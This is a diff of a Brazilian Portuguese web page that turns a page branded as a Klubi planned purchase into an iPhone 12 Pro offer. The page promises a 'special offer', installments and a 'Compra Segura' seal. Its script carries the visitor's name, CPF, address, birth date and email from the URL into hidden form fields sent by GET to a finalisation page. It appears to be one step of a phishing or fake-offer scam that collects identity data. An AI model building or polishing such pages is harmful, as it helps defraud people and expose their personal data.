@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pagamento</title>
+  <title>iPhone 12 Pro 256GB</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -12,7 +12,7 @@
       background-color: #f9f9f9;
     }
     .container {
-      max-width: 600px;
+      max-width: 900px;
       margin: 0 auto;
       background: #fff;
       padding: 20px;
@@ -32,8 +32,42 @@
       font-weight: bold;
       margin-bottom: 20px;
     }
-    .main-content h2 {
+    .product-info {
       text-align: center;
+    }
+    .main-img {
+      width: 100%;
+      max-width: 500px;
+      border-radius: 8px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      margin-bottom: 15px;
+    }
+    .image-gallery {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+    }
+    .image-gallery img {
+      width: 100px;
+      height: 100px;
+      object-fit: cover;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+    }
+    .image-gallery img:hover {
+      transform: scale(1.1);
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+    .product-info h2 {
+      font-size: 24px;
+      margin: 10px 0;
+    }
+    .product-info p {
+      font-size: 16px;
+      color: #555;
+      margin: 5px 0;
     }
     .credit-control {
       display: flex;
@@ -66,6 +100,12 @@
       text-align: center;
       margin: 20px 0;
     }
+    .discount {
+      font-size: 14px;
+      text-align: center;
+      color: #28a745;
+      font-weight: bold;
+    }
     footer {
       text-align: center;
     }
@@ -78,40 +118,83 @@
       font-size: 16px;
       cursor: pointer;
     }
+    .trust-seal {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 16px;
+      color: #28a745;
+      font-weight: bold;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <header>
-      <h1>Klubi | Compra Planejada</h1>
+      <h1>iPhone 12 Pro 256GB Cinza</h1>
     </header>
 
     <div class="offer-banner">
       Você ganhou uma oferta especial!
     </div>
 
-    <div class="main-content">
-      <h2>Conquiste um celular de</h2>
-      <img src="images (38).jpeg" alt="iPhone 12 Pro 256GB" style="width:100%; max-width:400px; margin: 20px auto; display: block;">
-      <h3>iPhone 12 Pro 256GB</h3>
-      <div class="credit-control">
-        <span class="credit-value">R$ 4.500,00</span>
+    <div class="product-info">
+      <!-- Imagem principal -->
+      <img src="images (41).jpeg" alt="iPhone 12 Pro 256GB Cinza" class="main-img">
+      
+      <!-- Galeria de imagens abaixo -->
+      <div class="image-gallery">
+        <img src="images (40).jpeg" alt="Imagem 1" onclick="document.querySelector('.main-img').src='images (40).jpeg'">
+        <img src="images (42).jpeg" alt="Imagem 2" onclick="document.querySelector('.main-img').src='images (42).jpeg'">
       </div>
 
-      <div class="payment-options">
-        <button class="payment-term active">Em 24 meses</button>
-      </div>
-
-      <div class="installments">
-        <p>com 24 mensalidades de</p>
-        <h3>R$ 187,50</h3>
-      </div>
-      <p class="discount">Ganhe 50% de desconto na 1ª mensalidade</p>
+      <h2>iPhone 12 Pro 256GB - Cinza Espacial</h2>
+      <p><strong>Características:</strong></p>
+      <p>- Tela Super Retina XDR de 6,1 polegadas</p>
+      <p>- Chip A14 Bionic, o mais rápido em um smartphone</p>
+      <p>- Sistema de câmeras triplo de 12 MP (Ultra-angular, Grande-angular e Teleobjetiva)</p>
+      <p>- Tecnologia 5G para velocidade ultra-rápida</p>
+      <p>- Capacidade: 256 GB</p>
+      <p>- Cor: Cinza Espacial</p>
     </div>
 
+    <div class="credit-control">
+      <span class="credit-value">R$ 4.500,00</span>
+    </div>
+
+    <div class="payment-options">
+      <button class="payment-term active">Em 24 meses</button>
+    </div>
+
+    <div class="installments">
+      <p>com 24 mensalidades de</p>
+      <h3>R$ 187,50</h3>
+    </div>
+    <p class="discount">Ganhe 50% de desconto na 1ª mensalidade</p>
+
     <footer>
-      <button class="continue-button" onclick="window.location.href='finalizacao.html'">Finalizar Compra</button>
+      <form id="paymentForm" action="finalizacao.html" method="get">
+        <input type="hidden" id="nome" name="nome">
+        <input type="hidden" id="cpf" name="cpf">
+        <input type="hidden" id="endereco" name="endereco">
+        <input type="hidden" id="dataNascimento" name="dataNascimento">
+        <input type="hidden" id="email" name="email">
+        <button type="submit" class="continue-button">Finalizar Compra</button>
+      </form>
     </footer>
+
+    <div class="trust-seal">
+      Compra Segura - Protegemos seus dados.
+    </div>
   </div>
+
+  <script>
+    // Recupera os dados da URL do formulário anterior
+    const params = new URLSearchParams(window.location.search);
+    document.getElementById('nome').value = params.get('nome');
+    document.getElementById('cpf').value = params.get('cpf');
+    document.getElementById('endereco').value = params.get('endereco');
+    document.getElementById('dataNascimento').value = params.get('dataNascimento');
+    document.getElementById('email').value = params.get('email');
+  </script>
 </body>
 </html>
